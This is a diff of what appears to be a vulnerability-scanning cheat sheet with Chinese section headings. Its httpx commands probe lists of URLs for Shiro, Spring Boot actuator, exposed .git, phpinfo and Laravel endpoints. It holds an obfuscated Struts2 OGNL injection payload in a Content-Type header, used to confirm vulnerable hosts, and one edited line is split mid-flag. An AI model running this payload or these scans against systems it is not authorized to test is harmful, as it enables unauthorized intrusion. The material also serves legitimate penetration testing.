@@ -19,7 +19,8 @@ ffuf -w urls.txt -u FUZZ -H "User-Agent: ${UA}" -H "Cookie: rememberMe=test;" -m
 cat urls.txt|httpx -H "Cookie: rememberMe=asdf;" -tls-probe -csp-probe -retries 1 -path '/api/' -match-string "rememberMe="
 
 ### 扫描 struts2
-cat urls.txt|httpx -H "User-Agent: ${UA}" -H "Content-Type: %{\u000a\u0009\u0023\u0009con\u0074ext\u0009\u005B\u0027com\u002E\u006Fpensy\u006Dphony\u002Exwo\u0072k2\u002Edispatche\u0072\u002EHttpS\u0065rvletRespons\u0065\u0027\u005D\u0009\u002e\u0009\u0061ddHe\u0061der\u0009\u000a\u0028\u0027Y-RES\u0027\u002C996-1\u0029}\u0009\u002E\u000amultipart/form-data" -tls-probe -csp-probe -match-string "Y-RES"
+cat urls.txt|httpx -H "User-Agent: ${UA}" -H "Content-Type: %{\u000a\u0009\u0023\u0009con\u0074ext\u0009\u005B\u0027com\u002E\u006Fpensy\u006Dphony\u002Exwo\u0072k2\u002Edispatche\u0072\u002EHttpS\u0065rvletRespons\u0065\u0027\u005D\u0009\u002e\u0009\u0061ddHe\u0061der\u0009\u000a\u0028\u0027Y-ASDFRES\u0027\u002C996-1\u0029}\u0009\u002E\u000amultipart/form-data" -tls-probe -csp-probe -match-string "Y-ASDFRES" -title -
+status-code -content-type
 
 ### 扫描 springboot
 cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/env,/actuator/env' -title -status-code -content-length -content-type -follow-redirects -match-string "java.runtime.name"
@@ -34,7 +35,7 @@ cat urls.txt|httpx -H "User-Agent: ${UA}" -path '/debug/pprof/' -title -status-c
 ### 扫描 .git /.git/HEAD ref:
 cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/.git/HEAD' -title -status-code -content-length -content-type -follow-redirects -match-string 'ref:'
 
-### 扫描 .svg
+### 扫描 .svn
 
 ### 扫描目录遍历 /css/,/static/
 cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/css/,/static/' -title -status-code -content-length -content-type -follow-redirects -match-string '<title>Index of'
@@ -43,6 +44,7 @@ cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/css/,/static/' -title -status
 cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/phpinfo.php' -title -status-code -content-length -content-type -follow-redirects -match-string '<title>phpinfo()</title>'
 
 ### lavarel
+cat urls.txt |httpx -x POST -paths '/' -body '1=2' -mc 405 -match-string 'MethodNotAllowedHttpException'
 
 ### 扫描 package.json
 cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/package.json' -title -status-code -content-length -content-type -follow-redirects -match-string 'description'
